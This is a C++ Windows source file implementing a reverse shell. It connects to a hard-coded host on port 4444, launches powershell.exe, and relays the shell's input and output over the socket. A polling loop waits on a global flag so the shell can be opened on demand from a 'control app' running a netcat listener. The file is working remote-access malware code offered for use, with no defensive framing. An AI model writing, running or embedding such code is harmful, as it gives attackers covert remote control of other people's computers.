#include "../include/socket_shell.h"

#pragma comment(lib, "ws2_32")

//Print a message to the console
void logToConsole(const std::string &message)
{
    std::cout << message << std::endl;
}

//Create a Powershell session and connect to the netcat terminal perviously opened in the control app's PC
int createPowershell()
{
    
    WSADATA wsaData;
    SOCKET mySocket;
    sockaddr_in myAddress;
    STARTUPINFOW sui;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    HANDLE hStdOutReadPipe, hStdOutWritePipe;
    HANDLE hStdInReadPipe, hStdInWritePipe;
    // Initialize Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    mySocket = socket(AF_INET, SOCK_STREAM, 0);

    // Define your target address and port
    myAddress.sin_family = AF_INET;
    myAddress.sin_port = htons(4444);                        // Port number
    inet_pton(AF_INET, "192.168.71.1", &myAddress.sin_addr); // Replace YOUR_IP
    //inet_pton(AF_INET, "192.168.71.1", &myAddress.sin_addr); // Replace YOUR_IP

    // Connect to the remote server
    if (connect(mySocket, (struct sockaddr *)&myAddress, sizeof(myAddress)) == SOCKET_ERROR)
    {
        logToConsole("Connection failed: " + to_string(WSAGetLastError()));
        closesocket(mySocket);
        WSACleanup();
        return 1;
    }

    logToConsole("Connected to server");
    // Set up the security attributes for the pipes
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create pipes for STDOUT and STDIN of the child process
    CreatePipe(&hStdOutReadPipe, &hStdOutWritePipe, &sa, 0);
    CreatePipe(&hStdInReadPipe, &hStdInWritePipe, &sa, 0);

    // Set up STARTUPINFO structure
    ZeroMemory(&sui, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = hStdInReadPipe;
    sui.hStdOutput = hStdOutWritePipe;
    sui.hStdError = hStdOutWritePipe;

    wchar_t cmd[] = L"powershell.exe";
    if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi)) {
        logToConsole("CreateProcess failed: " + to_string(GetLastError()));
        closesocket(mySocket);
        WSACleanup();
        return 1;
    }

    logToConsole("Shell launched");

    // Close unused ends of the pipes
    CloseHandle(hStdOutWritePipe);
    CloseHandle(hStdInReadPipe);

    // Set socket to non-blocking mode
    u_long mode = 1;
    ioctlsocket(mySocket, FIONBIO, &mode);

    // Redirect the socket to the pipes
    char buffer[1024];
    DWORD bytesRead, bytesWritten;
    bool shellActive = true;

    while (shellActive)
    {
        // Check for output from command shell
        PeekNamedPipe(hStdOutReadPipe, NULL, 0, NULL, &bytesRead, NULL);
        if (bytesRead > 0)
        {
            ReadFile(hStdOutReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
            buffer[bytesRead] = '\0'; // Null-terminate the buffer
            send(mySocket, buffer, bytesRead, 0);
        }

        // Check for input from socket
        int result = recv(mySocket, buffer, sizeof(buffer) - 1, 0);
        if (result > 0)
        {
            buffer[result] = '\0'; // Null-terminate the buffer
            WriteFile(hStdInWritePipe, buffer, result, &bytesWritten, NULL);
        }
        else if (result == 0)
        {
            shellActive = false; // Socket closed
        }
    }
    // Clean up
    CloseHandle(hStdOutReadPipe);
    CloseHandle(hStdInWritePipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    closesocket(mySocket);
    WSACleanup();
    logToConsole("Connection closed");
    return 0;
}

//Periodically check if the Powershell must be opened
void runReverseShell() {
    while (true) {
        while (!g_openShell.load()) {
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }
        // Powershell must be opened now
        int powershellOpenResult = createPowershell();
    }
}
